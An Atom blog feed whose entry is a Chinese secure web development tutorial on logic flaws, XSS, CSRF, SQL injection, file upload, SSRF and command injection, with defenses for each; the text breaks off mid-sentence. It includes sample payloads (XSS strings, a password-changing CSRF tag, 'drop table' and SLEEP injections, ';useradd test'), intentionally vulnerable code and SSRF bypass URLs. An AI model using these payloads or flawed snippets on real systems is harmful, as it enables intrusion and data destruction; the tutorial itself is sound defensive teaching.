<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>L0gs 4 xF0rk</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://l0gs.xf0rk.space/"/>
  <updated>2019-04-14T15:40:40.252Z</updated>
  <id>https://l0gs.xf0rk.space/</id>
  
  <author>
    <name>xF0rk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>安全建设之Web 安全开发</title>
    <link href="https://l0gs.xf0rk.space/2019/04/14/develop-secure-web-application/"/>
    <id>https://l0gs.xf0rk.space/2019/04/14/develop-secure-web-application/</id>
    <published>2019-04-14T09:24:34.000Z</published>
    <updated>2019-04-14T15:40:40.252Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Web 应用系统从设计、开发到上线、运营是一个较为复杂的过程，通常包含需求分析、架构设计、系统设计、功能设计、编码实现、测试评估、上线部署、业务运营等关键步骤。本文将简化部分 Web 系统开发相关流程，主要从功能设计、编码测试、发布部署、系统运营四个环节进行简单的安全风险分析，同时针对各环节出现的安全风险提出一些简单的防御措施。</p></blockquote><h1 id="Web-开发过程"><a href="#Web-开发过程" class="headerlink" title="Web 开发过程"></a>Web 开发过程</h1><img src="/2019/04/14/develop-secure-web-application/web_application_development.png"><p>如上图所示，将 Web 系统开发过程简化为四个环节：</p><ul><li>功能设计，业务研发部门将对 Web 系统相关业务功能进行需求分析、设计，该阶段可能会引入功能逻辑漏洞，包括篡改类、验证码类、越权类漏洞等</li><li>编码测试，开发、测试将对 Web 系统业务进行编码和功能测试，该阶段可能引入安全漏洞，包括第三方依赖包、开发框架或开发人员所编写的业务代码等</li><li>发布部署，由运维人员将 Web 应用相关基础组件进行部署，该阶段可能由于运维人员的疏忽或一些不安全的配置可能会引入一些类似于弱口令、未授权访问等安全漏洞</li><li>业务运营，由相关业务部门使用 Web 系统，该阶段由于 Web 系统对外提供服务，不可避免的需要面对外部的一些恶意流量，这也要求系统需要具有一定的“免疫”性</li></ul><p>上述的 Web 开发过程中的四个环节，无论在哪一个环节都可能由于功能、需求变更，需回归、迭代到四个环节中的任意环节。</p><img src="/2019/04/14/develop-secure-web-application/development_roll_back.png"><h1 id="Web-应用防御"><a href="#Web-应用防御" class="headerlink" title="Web 应用防御"></a>Web 应用防御</h1><p>未知攻，焉知防，要想知道如何对 Web 应用系统进行安全防御需要先了解 Web 应用系统相关攻击面及漏洞原理，本节内容将简单介绍部分 Web 漏洞基本原理，并提出较简单的防御手法，<strong>实际的业务系统需根据的组件、技术栈，选取具体的安全防御方案</strong>。</p><h2 id="功能逻辑漏洞"><a href="#功能逻辑漏洞" class="headerlink" title="功能逻辑漏洞"></a>功能逻辑漏洞</h2><p>通常研发或测试在业务编码实现过程中只关注正向（即强前端导向），在一定程度上忽略了异常数据类型校验，导致在业务功能上出现一些“奇妙”的功能漏洞，部分常见的逻辑漏洞如下图所示</p><img src="/2019/04/14/develop-secure-web-application/amazing_functions.png"><h3 id="篡改类漏洞"><a href="#篡改类漏洞" class="headerlink" title="篡改类漏洞"></a>篡改类漏洞</h3><p>篡改类漏洞，通过篡改请求 Header、Cookie、请求参数来欺骗服务端应用，或通过篡改服务端响应来欺骗前端页面进行响应，通常表现为数量篡改、积分篡改、单价篡改、现金篡改、订单号篡改等，如下图所示</p><img src="/2019/04/14/develop-secure-web-application/common_tamper.png"><h4 id="漏洞场景分析"><a href="#漏洞场景分析" class="headerlink" title="漏洞场景分析"></a>漏洞场景分析</h4><p>常见的篡改类漏洞场景如下</p><ul><li>1 分钱支付任意订单</li><li>0 元购买物品</li><li>商品数量为 0 时仍可购买商品</li><li>购买商品数量为负数</li><li>提现金额为负数</li><li>…  </li></ul><blockquote><p>篡改类漏洞本质是服务端过分依赖用户提交的数据，未根据业务特性对数据进行合理的检查。针对篡改类漏洞防御需要清晰理解业务功能，对业务数据进行合理校验检查。</p></blockquote><h3 id="验证码类漏洞"><a href="#验证码类漏洞" class="headerlink" title="验证码类漏洞"></a>验证码类漏洞</h3><img src="/2019/04/14/develop-secure-web-application/verify_code.png"><p>验证码，用于打破 Web 应用业务操作的可预测性，如上图所示，根据验证码出现形态不一样，可将验证码分为</p><ul><li>图形验证码</li><li>行为式验证码</li><li>口令验证码</li><li>短信验证码</li><li>令牌验证码</li></ul><p>验证码可用于人机识别、人人识别</p><ul><li>人机识别，区分自动化扫描、爬虫、爆破等恶意行为</li><li>人人识别，鉴别、确认操作者的身份，例如预设的短信验证码、口令验证码、令牌验证码等</li></ul><h4 id="漏洞场景分析-1"><a href="#漏洞场景分析-1" class="headerlink" title="漏洞场景分析"></a>漏洞场景分析</h4><p>验证码类漏洞，指在使用验证码进行人机识别、人人识别过程中被绕过，导致识别功能失效。若某 Web 应用系统存在如下验证码业务场景，用户 A 可通过短信验证码，来进行某项业务处理</p><img src="/2019/04/14/develop-secure-web-application/verify_code_bussiness.png"><p>进行威胁分析的时，需忽略前端的页面相关功能，针对服务端接口及业务功能进行安全风险分析</p><img src="/2019/04/14/develop-secure-web-application/verify_code_risk.png"><p>如上图所示，针对不同的业务步骤，可能存在以下安全风险</p><ul><li>步骤 1 <ul><li>频繁多次请求发送短信验证码，短信轰炸漏洞？</li><li>手机号格式是否正确，是否符合群发手机格式？</li></ul></li><li>步骤 2<ul><li>响应内容是否包含短信验证码？</li><li>短信验证码校验过程是否在前端页面进行校验？</li></ul></li><li>步骤 3<ul><li>验证码校验爆破是否可行？爆破空间有多大</li><li>验证码验证成功或失败后是否立即销毁？</li></ul></li><li>步骤 4<ul><li>业务逻辑功能是否与验证码用途一致？</li><li>响应的业务操作对象是否为用户 A？是否可为用户 B（非用户 A 本人）？</li><li><strong>是否可以直接跳过前 3 个步骤，直接进行步骤 4 ？</strong></li></ul></li></ul><blockquote><p>验证码类漏洞，需根据接口业务功能，进行严格的安全威胁建模分析，并针对不同的威胁提出合适的安全解决方案</p></blockquote><h3 id="越权类漏洞"><a href="#越权类漏洞" class="headerlink" title="越权类漏洞"></a>越权类漏洞</h3><p>越权类漏洞，指主体背离了业务系统中的应有（访问控制被绕过、缺失访问控制）访问控制，对客体进行了违规操作，如下图所示<br><img src="/2019/04/14/develop-secure-web-application/beyond_the_commission.png"></p><p>根据越权表现形式不同，可将越权分为（不同越权类型数据流，已在上图用不同颜色进行标识）</p><ul><li>未授权访问，匿名用户可操作用户 A 的相关数据或信息</li><li>水平越权，用户 A 可操作用户 B 的相关数据或信息</li><li>垂直越权，用户 A 可操作管理员 C 的相关数据或信息</li></ul><h4 id="漏洞场景分析-2"><a href="#漏洞场景分析-2" class="headerlink" title="漏洞场景分析"></a>漏洞场景分析</h4><p>若某 Web 应用系统中存在如下业务场景，用户 A 访问订单 A01 数据，服务端收到请求将 A01 数据响应<br><img src="/2019/04/14/develop-secure-web-application/beyond_the_commission_bussiness.png"></p><p>参照验证码类威胁分析过程，忽略前端页面功能，直接对服务端接口及业务功能进行安全风险分析<br><img src="/2019/04/14/develop-secure-web-application/beyond_the_commission_risk.png"></p><p>如上所示，针对不同的业务步骤，可能存在以下安全风险</p><ul><li>步骤 1<ul><li>用户若未登录能够进行此操作？</li><li>用户 A 能够查询 B01（用户 B）、C01（用户 C） 等非个人订单？</li><li>用户 A 除查询是否还有审批、支付等高权限操作？</li><li>响应内容是否包含敏感信息或高于用户 A 权限的信息数据？</li></ul></li></ul><blockquote><p>越权类漏洞，需根据接口业务功能，进行严格的权限控制，包括信息所属用户、所能执行操作、信息片段是否出现越权场景</p></blockquote><h2 id="框架编码漏洞"><a href="#框架编码漏洞" class="headerlink" title="框架编码漏洞"></a>框架编码漏洞</h2><p>开发、测试人员在 Web 应用系统实施过程中会进行系统编码和功能测试，由于个人疏忽或误操作可能引入安全漏洞，其中包括第三方依赖包、开发框架或开发人员所编写的业务代码等，甚至某些恶意攻击者会攻击公司相关产品、系统供应链上游，来对目标公司实施间接攻击。</p><h3 id="常规漏洞"><a href="#常规漏洞" class="headerlink" title="常规漏洞"></a>常规漏洞</h3><p>Web 应用系统中常规漏洞如下图所示，包括注入、XSS、文件上传、文件包含、CSRF 等安全漏洞，本章节将针对性选取部分常规漏洞进行漏洞原理分析，同时提供基本的防御方案。<strong>目前部分开源框架在某些功能上进行了较好的封装，规避了部分安全漏洞，本章节主要介绍基本漏洞原理，侧重于 0 到 1 过程中可能出现的安全漏洞及对应的防御方案</strong></p><img src="/2019/04/14/develop-secure-web-application/common_vulns.png"><blockquote><p>以下章节将从客户端（即浏览器端）、服务端两个方向介绍几个常规漏洞及防御方案，</p></blockquote><p><strong>同源策略</strong><br>Web 应用系统客户端大部分为浏览器端，并且随着客户端的业务功能越来越复杂，其所面对的安全风险点也越来越多。为约束客户端资源访问，浏览器会严格遵守<strong>同源策略</strong>约定。<br>同源策略用于限制不同源的 document 或脚本，对当前 document 读取或设置某些属性（如下表所示）。若无同源策略限制，则 A 站点的 JS 脚本在 B 站点未加载该脚本时可对 B 站点进行修改。</p><table><thead><tr><th style="text-align:left">属性</th></tr></thead><tbody><tr><td style="text-align:left">HTTP 消息头</td></tr><tr><td style="text-align:left">DOM 树</td></tr><tr><td style="text-align:left">浏览器存储（Cookie、LocalStorage）</td></tr></tbody></table><p>同源通常要求 HOST（IP或域名）、端口、协议一致，可通过下表判断是否与 <code>http://www.xf0rk.space/</code> 同源</p><table><thead><tr><th style="text-align:left">URL</th><th style="text-align:left">是否同源</th></tr></thead><tbody><tr><td style="text-align:left"><code>http://www.xf0rk.space/home/</code></td><td style="text-align:left">是</td></tr><tr><td style="text-align:left"><code>https://www.xf0rk.space/</code></td><td style="text-align:left">否</td></tr><tr><td style="text-align:left"><code>http://www.xf0rk.space:8080/</code></td><td style="text-align:left">否</td></tr><tr><td style="text-align:left"><code>http://www1.xf0rk.space/</code></td><td style="text-align:left">否</td></tr><tr><td style="text-align:left"><code>http://xf0rk.space/</code></td><td style="text-align:left">否</td></tr></tbody></table><p>默认不允许跨域访问，例如从 <code>www.xf0rk.space</code> 站点向 <code>www1.xf0rk.space/?data=wwwpass</code>，网站请求默认添加 <code>Origin: http://www.xf0rk.space</code> 头，只有站点明确返回头中包含 <code>Access-Control-Allow-Origin: http://www1.xf0rk.space</code>，才允许跨域访问，若设置 <code>Access-Control-Allow-Credentials</code> 为 true，则 <code>Access-Control-Allow-Origin</code> 不能设置成 *。</p><blockquote><p>script、img、iframe、link 等标签可以跨域加载资源，不受同源策略限制，注意加载 javascript 文件域不重要，重点是加载 javascript 页面所在的域，ajax 严格遵守同源策略</p></blockquote><p>Cookie 通常用于标识身份、Session 跟踪，其包含如下属性字段，可通过设置 Cookie 字段属性来限制 Cookie 读取传输方式</p><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:left">expires</td><td style="text-align:left">过期时间，若未设置，则表示为内存型 Cookie（Session Cookie），否则为本地型 Cookie（Third-Party Cookie）</td></tr><tr><td style="text-align:left">path</td><td style="text-align:left">相对路径，默认为目标页面，使用 JS 可实现跨路径读取 Cookie，设置路径不能确保 Cookie 被盗取</td></tr><tr><td style="text-align:left">domain</td><td style="text-align:left">域名，默认为本域，本域及其子域可以读取 Cookie</td></tr><tr><td style="text-align:left">HttpOnly</td><td style="text-align:left">默认无，表仅通过 HTTP 协议传输，不能被脚本读取</td></tr><tr><td style="text-align:left">Secure</td><td style="text-align:left">默认无，表仅通过 HTTPS 协议传输</td></tr></tbody></table><h4 id="客户端安全之XSS-漏洞"><a href="#客户端安全之XSS-漏洞" class="headerlink" title="客户端安全之XSS 漏洞"></a>客户端安全之XSS 漏洞</h4><h5 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h5><blockquote><p>XSS 漏洞，跨站脚本攻击，指篡改页面中注入了 HTML 代码，插入恶意代码，在用户浏览网页时控制用户浏览器的攻击行为。</p></blockquote><p><strong> 反射型 XSS </strong><br>反射型 XSS 漏洞，即服务端只是将用户输入数据渲染返回到用户端，某服务端代码如下所示</p><pre><code>&lt;?php  $input = $_GET[&quot;query&quot;]  echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;?&gt;</code></pre><p>若用户提交 <code>query=&lt;script&gt;alert(1)&lt;/script&gt;</code>，则 Web 后端应用会在页面上渲染出如下 HTML，导致出现 XSS 漏洞</p><pre><code>&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</code></pre><p><strong> 存储型 XSS </strong><br>存储型 XSS 漏洞存储用户输入数据，每次从“存储”中读取渲染页面时，都会触发 XSS，某服务端代码如下所示</p><pre><code>&lt;?php  $input = mysql_fetch_array($rs) // 从数据库读取  echo &quot;&lt;div&gt;&quot;.$input.&quot;&lt;/div&gt;&quot;?&gt;</code></pre><p>若 Web 应用从数据库读取的数据为 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，则 Web 后端应用在页面上渲染出现如下 HTML，导致 XSS 漏洞</p><pre><code>&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</code></pre><blockquote><p>存储型 XSS 与反射型 XSS 不同，反射型 XSS 通常为“一次性”，而存储型 XSS 为“持久型”，其风险级别通常会更高</p></blockquote><p><strong> DOM XSS </strong><br>DOM XSS 既可能是反射型 XSS 也可能是存储型 XSS，其命名与形成原因有关，某单页页面如下所示</p><pre><code>&lt;script&gt;  function test() {      var iStr = document.getElementById(&quot;text&quot;).value; // 读取 text 中值，进行DOM 渲染    document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&#39;&quot; + iStr + &quot;&#39;&gt;test&lt;/a&gt;&quot;;  }&lt;/script&gt;&lt;div id=&quot;t&quot;&gt;&lt;/div&gt;&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;</code></pre><p>若用户输入<code>&#39; onclick=alert(1) //</code>，则在前端页面渲染出现如下 HTML，导致 XSS 漏洞</p><pre><code>&lt;a href=&#39;&#39; onclick=alert(1) //&#39;&gt;test&lt;/a&gt;</code></pre><img src="/2019/04/14/develop-secure-web-application/dom_xss_show.png"><h5 id="漏洞基础防御"><a href="#漏洞基础防御" class="headerlink" title="漏洞基础防御"></a>漏洞基础防御</h5><p><strong> HttpOnly 加固 </strong><br>XSS 漏洞可用来窃取用户 Cookie 等，如下图所示，所以可以设置 Cookie 属性为 HttpOnly，禁止脚本读取 Cookie</p><img src="/2019/04/14/develop-secure-web-application/xsspt_steal_cookie.png"><p>若设置了 HttpOnly，攻击者仍可通过页面截图来窃取目标漏洞系统上的敏感信息，如下图所示</p><img src="/2019/04/14/develop-secure-web-application/xsspt_make_the_shortcut.png"><p><strong> 输入输出检查 </strong><br>XSS 漏洞源自用户不安全的输入，所以在防御 XSS 漏洞时，可对用户输入检查或输出渲染页面时进行输出检查，如下图所示</p><img src="/2019/04/14/develop-secure-web-application/xss_filter.png"><p>输入检查，即对用户输入内容进行检查，可分为黑、白名单：</p><ul><li>白名单，业务内容格式检查，例如生日、身份证号、手机号等；输入检查逻辑必须在服务端进行</li><li>黑名单，过滤用户输入的特殊字符，但存在对内容语境理解不够准确</li></ul><blockquote><p>富文本处理，需过滤所有事件，同时采用白名单过滤形式</p></blockquote><p>输出检查，将用户输入渲染到页面时进行转义，XSS 实质是 HTML 代码注入，在服务端对各种值为注入点进行针对性编码</p><ul><li>HTML 标签，使用 HtmlEncode 编码</li><li>HTML 属性，使用 HtmlEncode 编码</li><li>SCRIPT 标签，使用 JavascriptEncode 编码</li><li>CSS 样式，使用 encodeForCSS 编码</li><li>地址输出，确认地址以 HTTP（S）开头，验证地址格式有效性后，再进行 URLEncode 编码</li></ul><blockquote><p>输出检查转义需根据系统架构的前端框架选取与上述 5 个对应的转义方法函数进行转义，需注意各种输出标签位置必须与编码方法对应，否则输出检查转义将会失效</p></blockquote><img src="/2019/04/14/develop-secure-web-application/xss_error_escape_method.png"><p>如上所示场景，输出目标为 HTML 中的属性，但是却采用了 JavascriptEncode，导致输出检查转义失败，仍存在 XSS 漏洞，XSS 漏洞如下图所示</p><img src="/2019/04/14/develop-secure-web-application/xss_error_escape_method_show.png"><p>正确的场景应选择 encodeForHTML 方法，如下所示</p><img src="/2019/04/14/develop-secure-web-application/xss_escape_success.png"><img src="/2019/04/14/develop-secure-web-application/xss_escape_success_show.png"><h4 id="客户端安全之-CSRF"><a href="#客户端安全之-CSRF" class="headerlink" title="客户端安全之 CSRF"></a>客户端安全之 CSRF</h4><h5 id="漏洞原理分析-1"><a href="#漏洞原理分析-1" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h5><blockquote><p>CSRF，跨站点请求伪造，即当用户访问一个特定页面或链接时，在用户不知情的情况下被恶意发起某个请求的攻击行为。</p></blockquote><p>若某业务系统如下链接用于给用户修改密码</p><pre><code>http://testcsrf.xf0rk.space/changepasswd.jsp?newpass=123456&amp;confirmpass=123456</code></pre><p>若攻击者在某公共页面（例如某条动态或某条新闻）渲染时恶意添加如下 HTML IMG 标签时，则任意用户访问该公共页面时其个人密码会被自动修改成 123456，则表示存在 CSRF 漏洞。</p><pre><code>&lt;img src=&quot;http://testcsrf.xf0rk.space/changepasswd.jsp?newpass=123456&amp;confirmpass=123456&quot;/&gt;</code></pre><p>有的人可能会说密码修改业务请求方法为 POST ，IMG 只能发起 GET 请求，但是如果你后端的 JSP 代码如下所示，则其仍可读取 POST 和 GET 方法提交的参数，导致上述攻击场景仍然存在</p><pre><code>String newpass = request.getParameter(&quot;newpass&quot;); String confirmpass = request.getParameter(&quot;confirmpass&quot;);</code></pre><p><strong> CSRF 基础 </strong><br>通常可以把浏览器客户端的 Cookie 分为 Session Cookie（内存 Cookie）、Third-party Cookie（本地 Cookie），在浏览一个站点过程中，若网站设置了 Session Cookie，那么在同一个浏览器进程，若访问同源的站点，浏览器将会在后台自动发送 Session Cookie，即共用了 Session Cookie；而 Third-patry Cookie 在某些浏览器中会被阻止发送，如下图所示</p><img src="/2019/04/14/develop-secure-web-application/csrf_about_the_cookies.png"><blockquote><p>由于同源站点共享了 Session Cookie，若后端服务器用 Session Cookie 来进行身份标识，则后端应用也会正常响应 IMG 发起的 GET 请求，导致伪造请求操作成功。</p></blockquote><h5 id="漏洞基础防御-1"><a href="#漏洞基础防御-1" class="headerlink" title="漏洞基础防御"></a>漏洞基础防御</h5><p>在 CSRF 漏洞利用成功的一个关键点是参数可以被预测，如下所示</p><pre><code>&lt;img src=&quot;http://testcsrf.xf0rk.space/changepasswd.jsp?newpass=123456&amp;confirmpass=123456&quot;/&gt;</code></pre><p>为防护 CSRF 漏洞，需要移除、打破这种可预测性，如下</p><ul><li>关键操作验证码，<code>newpass=&amp;confirmpass=&amp;code=[随机]</code></li><li>增加交互业务功能，<code>newpass=&amp;confirmpass=&amp;oldpass=[输入旧密码]</code></li><li>CSRF TOKEN，通常为框架自带 <code>newpass=&amp;confirmpass=&amp;csrftoken=[自动]</code></li><li>Referer 校验</li></ul><h4 id="服务端安全之-SQL-注入"><a href="#服务端安全之-SQL-注入" class="headerlink" title="服务端安全之 SQL 注入"></a>服务端安全之 SQL 注入</h4><h5 id="漏洞原理分析-2"><a href="#漏洞原理分析-2" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h5><blockquote><p>SQL 注入，Web 应用系统在后端查询数据库时，直接将用户输入拼接到 SQL 查询语句，导致出现非预期的未授权的 SQL 数据库查询、操作行为。</p></blockquote><p>若某业务系统后端数据库查询操作如下所示</p><pre><code>String userid = requestData.get(&quot;userid&quot;);String sql = &quot;select * from users where userid = &#39;&quot; + userid + &quot;&#39;&quot;;</code></pre><p>针对不同的输入，其拼接后的 SQL 查询语句如下所示，针对第一种提交输入，若 Web 应用服务端未将错误 try catch 则 Web 应用进行 SQL 查询时可在浏览器端可收到错误信息，即可判断是否存在 SQL 注入；若 Web 应用服务端捕获了 SQL 查询错误，则可通过提交后 4 种请求，通过响应时间、响应内容来判断是否存在 SQL 注入。</p><table><thead><tr><th style="text-align:left">userid</th><th style="text-align:left">拼接后 SQL 语句</th></tr></thead><tbody><tr><td style="text-align:left"><code>&#39;</code></td><td style="text-align:left"><code>select * from users where userid = &#39;&#39;&#39;</code></td></tr><tr><td style="text-align:left"><code>&#39;; drop table users--</code></td><td style="text-align:left"><code>select * from users where userid = &#39;&#39;; drop table users--&#39;</code></td></tr><tr><td style="text-align:left"><code>0001&#39; AND &#39;1=1</code></td><td style="text-align:left"><code>select * from users where userid = &#39;0001&#39; AND &#39;1=1&#39;</code></td></tr><tr><td style="text-align:left"><code>0001&#39; AND &#39;1=2</code></td><td style="text-align:left"><code>select * from users where userid = &#39;0002&#39; AND &#39;1=2&#39;</code></td></tr><tr><td style="text-align:left"><code>0&#39; AND SLEEP(6) AND &#39;</code></td><td style="text-align:left"><code>select * from users where userid = &#39;0&#39; AND SLEEP(6) AND &#39;&#39;</code></td></tr></tbody></table><h5 id="漏洞基础防御-2"><a href="#漏洞基础防御-2" class="headerlink" title="漏洞基础防御"></a>漏洞基础防御</h5><p><strong> 预编译语句 </strong></p><pre><code>String sql = &quot;select * from users where userid = ?&quot;;PreparedStatement preparedStat = connection.prepareStatement(sql)preparedStat.setString(1, userid)ResultSet results = preparedStat.executeQuery()</code></pre><p><strong> 存储过程 </strong></p><pre><code>CallableStatement callableStat = connection.prepareCall(&quot;{call sp_getUsrInfo}&quot;)callableStat.setString(1, userid)ResultSet results =callableStat.executeQuery()</code></pre><p><strong> 数据类型检查 </strong></p><pre><code>正则检查 userid 字符格式，例如全为数字、无特殊符号限制 userid 字符串长度业务数据类型，例如手机号、邮箱等</code></pre><p><strong> 数据库加固 </strong></p><pre><code>最小权限原则，数据库、表读、写权限、自定义函数权限、读写本地文件权限等</code></pre><h4 id="服务端安全之文件上传漏洞"><a href="#服务端安全之文件上传漏洞" class="headerlink" title="服务端安全之文件上传漏洞"></a>服务端安全之文件上传漏洞</h4><h5 id="漏洞原理分析-3"><a href="#漏洞原理分析-3" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h5><blockquote><p>文件上传漏洞，指用户绕过安全防护，上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。</p></blockquote><p>若某业务服务器有如下的文件上传功能，用户可通过该接口上传图片</p><img src="/2019/04/14/develop-secure-web-application/file_upload_select.png"><p>文件上传接口未对上传文件类型进行检查，导致可直接上传 PHP 文件</p><img src="/2019/04/14/develop-secure-web-application/file_upload_php_success.png"><p>可利用上传的 PHP 文件直接执行命令、进行文件管理等</p><img src="/2019/04/14/develop-secure-web-application/file_upload_webshell_cmd.png"><img src="/2019/04/14/develop-secure-web-application/file_upload_webshell_file.png"><h5 id="漏洞基础防御-3"><a href="#漏洞基础防御-3" class="headerlink" title="漏洞基础防御"></a>漏洞基础防御</h5><p>以下内容将介绍几个防御及绕过方法，最后将介绍一个无风险的处理方案</p><p><strong> 进阶一 </strong><br><img src="/2019/04/14/develop-secure-web-application/file_upload_level_1.png"></p><p>上传文件模块增加校验</p><ul><li>图片 Content-Type 类型校验，可直接修改 POST 请求中 Content-Type 值来实现绕过</li></ul><img src="/2019/04/14/develop-secure-web-application/file_upload_level_1_bypass.png"><p><strong> 进阶二 </strong><br><img src="/2019/04/14/develop-secure-web-application/file_upload_level_2.png"></p><p>上传文件模块增加校验</p><ul><li>图片 Content-Type 类型校验，可直接修改 POST 请求中 Content-Type 值来实现绕过</li><li>文件后缀检查，可通过 <code>%00</code> 截断绕过，仅在低版本 PHP 中生效</li><li>简单图片格式校验，可在正常图片中替换部分内容为一句话木马，或在正常图片后拼接一个 PHP 文件</li></ul><img src="/2019/04/14/develop-secure-web-application/file_upload_level_2_bypass.png"><p><strong> 进阶三 </strong><br><img src="/2019/04/14/develop-secure-web-application/file_upload_level_3.png"></p><p>上传模块增加校验</p><ul><li>图片 Content-Type 类型校验，可直接修改 POST 请求中 Content-Type 值来实现绕过</li><li>文件后缀检查，可通过 <code>%00</code> 截断绕过，仅在低版本 PHP 中生效</li><li>将上传图片文件重新读取绘制新的图片，写入到另外一个图片文件中，不可绕过</li></ul><h4 id="服务端安全之-SSRF"><a href="#服务端安全之-SSRF" class="headerlink" title="服务端安全之 SSRF"></a>服务端安全之 SSRF</h4><h5 id="漏洞原理分析-4"><a href="#漏洞原理分析-4" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h5><blockquote><p>SSRF(Server-side Request Forge, 服务端请求伪造)，由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务。</p></blockquote><p>若业务包含如下图所示功能，当用户在 <code>ssrf_curl.php?url=</code> 后添加一个图片的 URL 时，Web 应用会发起目标 URL 的请求，并将返回的图片响应至客户端</p><img src="/2019/04/14/develop-secure-web-application/ssrf_show_demo.png"><p>上述业务功能使用 PHP 实现代码如下所示</p><pre><code>&lt;?php  $url = $_GET[&#39;url&#39;];  $ch = curl_init();  curl_setopt($ch, CURLOPT_URL, $url);  curl_setopt($ch, CURLOPT_HEADER, false);  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/5.0 (Windows NT 6.1)&#39;);  // allow 302  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);  $res = curl_exec($ch);  // set content-type  header(&#39;Content-Type: image/png&#39;);  curl_close($ch) ;  //return response  echo $res;?&gt;</code></pre><p>PHP 代码中直接通过 curl 来发起目标 URL 请求，并且没有对目标 URL 进行合理的检查，导致可发起除 HTTP 协议之外的其他请求，CURL 支持的协议如下所示</p><img src="/2019/04/14/develop-secure-web-application/ssrf_curl_protos.png"><p><strong> SSRF 之任意文件读取 </strong><br>如下可通过 <code>file://</code> 读取目标主机任意文件</p><img src="/2019/04/14/develop-secure-web-application/ssrf_curl_file.png"><p><strong> SSRF 之操作 Redis </strong><br>如下可通过 <code>dict://</code> 访问内网 Redis 信息</p><img src="/2019/04/14/develop-secure-web-application/ssrf_curl_redis_info.png"><p>通过 SSRF 操作 Redis 写入定时任务，将目标主机 GetShell</p><img src="/2019/04/14/develop-secure-web-application/ssrf_curl_redis_set.png"><p>写入定时反弹任务</p><img src="/2019/04/14/develop-secure-web-application/ssrf_curl_redis_set_reverse_shell.png"><p>目标机器触发定时任务，将 bash 反弹至攻击机器上，导致 getshell</p><img src="/2019/04/14/develop-secure-web-application/ssrf_curl_redis_getshell.png"><h5 id="漏洞基础防护"><a href="#漏洞基础防护" class="headerlink" title="漏洞基础防护"></a>漏洞基础防护</h5><pre><code>http:192.168.56.101/ssrf_curl.php?url=http://l0gs.xf0rk.space/images/logo.jpg</code></pre><p>SSRF 漏洞思路为通过 CURL 请求一个图片，由于 CURL 支持协议过多、URL 目标不可控，所以为防御 SSRF 漏洞，需要确保目标 URL 可控，可从协议、目标两个方向进行控制</p><p><strong> 协议控制 </strong><br>根据业务需求，限制 CURL 所能协议，可通过白名单形式来过滤</p><pre><code>dictfileftpftpsgopherhttphttpsimapimapsldapldapspop3pop3srtmprtspsmbsmbssmtpsmtpstelnettftp</code></pre><p><strong> 目标控制 </strong><br>目标控制可采用白名单和黑名单策略，白名单只需指定能够访问的 URL，控制简单有效，若使用黑名单，控制 URL 目标容易被绕过，绕过主要指通过 URL特性、302 跳转、IP 转换等绕过目标黑名单，部分绕过如下</p><ul><li>URL 特性，<code>http://www.xf0rk.space@www1.xf0rk.space/</code> =&gt; <code>http://www1.xf0rk.space</code></li><li>进制转换 <code>http://3232235777/</code>  =&gt;  <code>http://192.168.1.1</code></li><li>URL特性 <code>www.xf0rk.space%2E%62%61%69%64%75%2E%63%6F%6D%0D%0A</code> =&gt; <code>www.xf0rk.space.a.cn</code></li><li>短网址 <code>http://dwz.cn/11SMa</code>  &gt;&gt;&gt;  <code>http://127.0.0.1/</code></li><li>域名解析 <code>http://127.0.0.1.attack.io/</code> =&gt; <code>http://127.0.0.1/</code></li><li>302跳转 <code>http://127.0.0.1.attack.io/</code> =&gt; <code>http://127.0.0.1/</code></li><li>IPV6 =&gt; IPV4</li><li>…</li></ul><h4 id="服务端安全之命令注入"><a href="#服务端安全之命令注入" class="headerlink" title="服务端安全之命令注入"></a>服务端安全之命令注入</h4><h5 id="漏洞原理分析-5"><a href="#漏洞原理分析-5" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h5><p>在 SSRF 的例子中，通过 PHP 中的 CURL 模块来实现实际的业务功能，若直接通过调用 CURL 命令来实现的话，需注意可能存在命令注入漏洞，如下所示</p><pre><code>&lt;?php  $url = $_GET[&#39;url&#39;];  exec(&quot;curl &quot;.$url)  ....?&gt;</code></pre><p>命令注入请求如下，当 Web 处理完用户请求后，目标系统则成功创建 test 用户</p><pre><code>http:192.168.56.101/ssrf_curl.php?url=http://l0gs.xf0rk.space/images/logo.jpg;useradd test</code></pre><h5 id="漏洞基础防护-1"><a href="#漏洞基础防护-1" class="headerlink" title="漏洞基础防护"></a>漏洞基础防护</h5><p>命令注入本质是由于未安全过滤用户输入，导致 Web 应用未授权执行了用户恶意构造的命令，所以 Web 应用处理用户输入应注意</p><ul><li>采用白名单或正则表达式对用户输入进行过滤</li><li>不让用户直接控制 eval、system、exec、shell_exec 等敏感函数</li><li>进入执行命令函数和方法前，对变量进行过滤，对敏感字符进行转义</li></ul><h3 id="框架漏洞"><a href="#框架漏洞" class="headerlink" title="框架漏洞"></a>框架漏洞</h3><p>在 Web 